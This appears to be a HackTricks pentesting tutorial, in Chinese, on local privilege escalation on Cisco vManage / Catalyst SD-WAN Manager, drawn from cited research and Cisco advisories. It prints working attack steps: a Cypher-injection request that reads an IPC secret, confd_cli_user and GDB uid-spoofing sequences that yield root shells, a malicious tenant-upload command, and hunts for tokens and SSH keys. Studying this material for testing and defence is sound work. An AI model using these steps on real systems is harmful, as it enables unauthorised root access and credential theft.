# Cisco - vmanage

一旦你以 `vmanage`、`netadmin` 或 `vmanage-admin` 身份在 Cisco vManage / *Catalyst SD-WAN Manager* 上获得代码执行权限，最值得关注的本地提权面通常包括 `confd` CLI stack、`cmdptywrapper` helper、本地主机 REST APIs，以及由 root 拥有的 import/upload handlers。

如果你仍需要在 controller 上取得**初始 foothold**，请先查看专门的 control-plane 页面：

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## 快速本地排查
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
如果从你的 foothold 可以读取 `/etc/confd/confd_ipc_secret`，Path 1 和 Path 2 就立即变得可行。如果你是通过 remote file disclosure 或 webshell 获得访问权限的，还应检查 `vmanage-admin` 的 SSH material 以及 multitenancy upload handlers；近期研究证明，这两者都可以作为可行的 pivot。<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv 对 vManage 的 assessment 记录了这条 root-shell 路径。<sup>[[5]](#references)</sup>

报告链接的 [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html) 描述了 IPC authentication；其中的 vManage 示例将 secret 放置在 `/etc/confd/confd_ipc_secret`，并显示该文件可由 `vmanage` 读取。<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
由于 Neo4j 在所报告的配置中以 `vmanage` 权限运行，之前的 Cypher injection 可以读取 secret file。<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 本身不接受命令行参数；它会调用 `/usr/bin/confd_cli_user`。报告的工作流程会从 rootfs 中提取该 root 可读的 helper，通过 `scp` 复制它，读取其帮助信息，设置 `CONFD_IPC_ACCESS_FILE`，然后使用 `-U 0 -G 0` 调用它以获得 root shell。<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 路径 2

此替代路径改编自 Walmart Global Tech 对 vManage 19.2.2 的研究。<sup>[[6]](#references)</sup>

Synacktiv 路径需要一份 `/usr/bin/confd_cli_user` 的副本，该文件在报告的设置中可由 root 读取；而 Walmart 报告则通过 GDB 修改 `confd_cli` 的身份值。<sup>[[5]](#references)[[6]](#references)</sup>

该报告的反汇编显示，`confd_cli` 会收集调用者的 UID 和 GID。<sup>[[6]](#references)</sup>

<details>
<summary>显示 UID/GID 收集过程的 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

同一测试显示，一个由 root 拥有的 `cmdptywrapper` 接收了明确的 `-g` 和 `-u` 值。<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
研究人员推断，`confd_cli` 会将已登录用户的 UID 和 GID 转发给 `cmdptywrapper`。<sup>[[6]](#references)</sup>

直接使用 `-g 0 -u 0` 运行 `cmdptywrapper` 失败了，因为所需的文件描述符（示例中的 `-i 1015`）不可用。<sup>[[6]](#references)</sup>

由于 `confd_cli` 不会将这些值作为参数公开，报告使用 GDB 覆盖 `getuid()` 和 `getgid()` 的返回值；该 appliance 中存在 GDB。<sup>[[5]](#references)[[6]](#references)</sup>

在获得 `vmanage` 访问权限后，测试可以读取 `/etc/confd/confd_ipc_secret`；以下脚本会强制两个身份调用均返回零。<sup>[[6]](#references)</sup>

报告中使用的 GDB 脚本如下：<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
报告的控制台输出为：<sup>[[6]](#references)</sup>

<details>
<summary>控制台输出</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3（2025 CLI 输入验证漏洞 - CVE-2025-20122）

Cisco 后来在其针对 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) 发布的官方公告中，记录了一条更简洁的本地 root 路径。一个**仅拥有只读权限的 authenticated attacker**可以向 manager CLI 发送构造的请求，并利用输入验证不足获取 root 权限。<sup>[[7]](#references)</sup>

从 offensive 角度来看，该公告以及早期的 CLI 研究表明了以下工作流程。<sup>[[6]](#references)[[7]](#references)</sup>

1. 一旦你在设备上取得了*任何* low-priv foothold，就应先测试本地 CLI service，再进行更复杂的 Path 1 / Path 2 流程。
2. 复用 Path 2 中的 artifacts 来查找 trust boundary：`confd_cli` → `cmdptywrapper` → `vshell`。
3. 将所有转发到 CLI backend 的字段视为可疑内容：UID/GID、username、terminal metadata、imported files，或任何之后会被 root-owned helper 使用的值。
4. 如果 low-priv user 可以访问本地 CLI socket 并影响这些字段，那么距离 root 可能只差一个 crafted request。

在 appliance 上成功落地后，按如下方式检查本地 CLI chain。<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
这将 2025 年的 bug 转化为一种可复用的 hunting pattern：寻找**在 userland 中收集身份信息，并将其转发给特权 wrapper 的本地 CLI shim**。<sup>[[6]](#references)[[7]](#references)</sup>

不要将 **CVE-2025-20122** 与之后的 **CVE-2026-20122** 混淆：2025 年的问题是一个从 *local* CLI 到 root 的 bug，而 2026 年的问题是一个 *remote* API arbitrary file overwrite，主要用于植入 foothold，然后再回头尝试 Path 1 / Path 2 / Path 4。<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4（2026 low-priv REST API to root - CVE-2026-20126）

Cisco 2026 年 2 月的 advisory 描述了另一类有用的 privesc：[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)。由于 REST API 中存在不充分的 user-authentication mechanism，**已认证的、具有 low privileges 的本地 attacker**可以获得 root 权限。<sup>[[1]](#references)</sup>

这很重要，因为 vManage privesc 不再局限于 `confd`/TTY abuse；获得 low-priv shell 后，还应继续寻找以下内容。<sup>[[1]](#references)</sup>

- 仅限 localhost 的 API endpoints，它们过度信任调用者
- 当前账户可读取的 tokens、cookies 或 service credentials
- 通过 `dataservice`/REST handlers 暴露、且仍可在本地触发的 root-only actions

在实践中，一旦你以 `vmanage` 或其他 service user 的身份获得 shell，本地 API abuse 可能比交互式 CLI abuse 更容易实现自动化。<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
如果本地 session context 足以访问 privileged REST functionality，优先选择 API path：它更易于 replay、编写脚本，并与被窃取的 web sessions 或 API tokens 进行链式利用。<sup>[[1]](#references)</sup>

## 路径 5（2026 crafted file 由 root 处理 - CVE-2026-20245）

另一个近期模式是 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)。具有 `netadmin` 权限的本地攻击者可以上传一个 **crafted file**，之后 CLI 会以不安全的方式处理该文件，最终以 `root` 身份导致 command injection。<sup>[[2]](#references)</sup>

从 HackTricks 的角度来看，有价值的 technique 不局限于具体 CVE。<sup>[[2]](#references)</sup>

1. 枚举所有接受文件的 CLI 或 web workflow：imports、diagnostic bundles、templates、validators、backups、tenant data 等。
2. 跟踪上传文件的落点，以及哪个由 root 所有的 script 或 binary 会使用该文件。
3. 测试文件名、文件内容或解析后的 metadata 是否曾被传递给 shell commands、wrapper scripts 或 `system()`-style helpers。
4. 如果已经可以获得 `netadmin`（有效 creds、被窃取的 session 或 auth-bypass chain），file-processing bugs 通常是获得 root 的最快路径。

Google Cloud / Mandiant 后来展示了此类 bug 通过 multitenancy import path 被利用的具体实例。<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
在观察到的攻击中，构造的 CSV 修改了 `/etc/passwd` 和 `/etc/shadow`，以创建一个临时的 UID 0 账户（`troot`）。这使得 `tenant-upload` / `tenant-list` 风格的导入器尤其值得关注：它们不仅是数据导入功能，还可能是由 root 所有的 parser 前端。<sup>[[4]](#references)</sup>

一个快速的 shell 侧 hunting 模式是：
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
此类 bug 与授予 `netadmin` 但不授予 `root` 的 remote footholds 尤其适合进行 chain。<sup>[[2]](#references)[[4]](#references)</sup>

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **未认证 info leak (CVE-2026-20133)** – 价值尤其高，因为公开研究表明它可能暴露 `confd_ipc_secret` 或 `vmanage-admin` private key，从而将 read bug 转化为 Path 1 或 NETCONF pivot。<sup>[[3]](#references)</sup>
- **已认证 API arbitrary file overwrite (CVE-2026-20122)** – 与上文的 2025 CLI bug 不同；VulnCheck 利用它上传了 webshell，随后本页面中的 local privesc paths 便立即变得相关。<sup>[[3]](#references)</sup>
- **已认证 UI XSS (CVE-2024-20475)** – 已认证 attacker 可以在受影响用户的 web interface 中执行 script；应评估由此产生的 session context 是否暴露能够触及 `vshell` 或上述 local privesc paths 的 API/CLI actions。<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 这是 Path 5 的非常强的 precursor，因为 `netadmin` 正是 2026 crafted-file privesc 所要求的 level。<sup>[[2]](#references)[[3]](#references)</sup>
- **已认证 arbitrary file write (CVE-2026-20262)** – 其 offensive value 与 CVE-2026-20122 类似，但通过后续的 web UI upload path 实现；Cisco 表示，该 bug 创建或覆盖的 file 随后可用于提升至 root。<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 年的 intrusions 表明，attackers 可以回滚到较旧的 vulnerable SD-WAN build，利用旧版 CLI root bug，然后恢复原始 version。<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 专门的 SD-WAN control-plane 页面中对此有更详细的说明；它可以为 `vmanage-admin` append 一个 SSH key，从而为后续 management-plane actions 提供持久的 NETCONF access。<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller、Catalyst SD-WAN Manager 和 Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck：Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant：Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1：Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 对 Cisco Catalyst SD-WAN 的 Active exploitation (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7：CVE-2026-20182 - Critical authentication bypass in Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
